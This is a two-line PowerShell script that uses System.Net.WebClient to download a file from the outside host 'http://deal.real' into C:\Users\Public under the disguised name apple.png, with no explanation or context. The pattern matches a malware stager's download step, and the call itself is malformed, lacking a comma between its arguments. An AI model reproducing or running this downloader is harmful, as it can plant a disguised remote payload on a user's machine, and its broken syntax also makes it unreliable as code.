#!/usr/bin/env pwsh
(new-object system.net.webclient).downloadFile('http://deal.real' 'C:\Users\Public\apple.png')